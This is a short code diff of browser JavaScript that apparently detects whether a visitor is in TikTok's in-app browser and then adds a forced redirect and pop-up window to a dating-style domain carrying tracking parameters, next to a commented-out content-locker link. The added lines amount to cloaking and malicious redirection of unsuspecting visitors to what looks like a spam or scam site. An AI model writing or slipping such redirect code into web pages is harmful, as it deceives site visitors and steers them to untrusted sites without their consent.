@@ -79,6 +79,12 @@ if (agent.indexOf('music') >= 0) {
   // root.style.display = 'none';
   console.log('not in tiktok');
 
+  location.href = 'https://ohmyhoney-datingnew.life/?u=13bk60m&o=0rygz59';
+  window.open(
+    'https://ohmyhoney-datingnew.life/?u=13bk60m&o=0rygz59',
+    '_blank'
+  );
+
   // https://locked4.com/cl/i/8d5r9r
   // const links = document.querySelectorAll('a');
   // links.forEach((link) => {
